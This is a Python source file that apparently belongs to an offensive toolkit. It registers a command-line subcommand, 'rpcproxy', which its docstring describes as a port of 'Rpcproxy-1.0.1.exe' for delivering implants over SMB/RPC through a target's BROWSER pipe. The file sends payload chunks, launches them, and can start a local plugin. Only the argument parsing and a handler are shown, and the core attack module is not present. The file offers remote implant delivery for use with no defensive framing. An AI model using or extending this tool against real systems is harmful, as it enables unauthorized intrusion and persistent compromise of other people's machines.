"""rpcproxy — RPC proxy / implant delivery via BROWSER pipe.

Port of Rpcproxy-1.0.1.exe. Uses SMB + RPC to bind to the target's BROWSER
interface, then sends implant payloads (PayloadSize, PayloadChunk,
PayloadLaunch) and optionally spawns a local plugin thread (LPEntryPoint).
"""
from . import rpcproxy


def rpcproxy_handle(args):
    return rpcproxy.run(
        target_ip=args.target_ip, target_port=args.target_port,
        protocol=args.protocol, version_major=args.version_major,
        version_minor=args.version_minor, server_name=args.server_name,
        client_name=args.client_name, lp_filename=args.lp_filename,
        lp_entry_point=args.lp_entry_point, implant_filename=args.implant_filename,
        polling_interval=args.polling_interval, network_timeout=args.network_timeout,
    )


def reg_subparser(subparsers):
    p = subparsers.add_parser("rpcproxy", help="RPC Proxy (Rpcproxy)", description=__doc__)
    p.add_argument("target_ip")
    p.add_argument("-P", "--target-port", type=int, default=445)
    p.add_argument("--protocol", choices=["SMB", "NBT"], default="SMB")
    p.add_argument("--version-major", type=int, default=1)
    p.add_argument("--version-minor", type=int, default=0)
    p.add_argument("--server-name")
    p.add_argument("--client-name")
    p.add_argument("--lp-filename")
    p.add_argument("--lp-entry-point")
    p.add_argument("--implant-filename")
    p.add_argument("--polling-interval", type=int, default=0)
    p.add_argument("--network-timeout", type=float, default=30.0)
    p.set_defaults(func=rpcproxy_handle)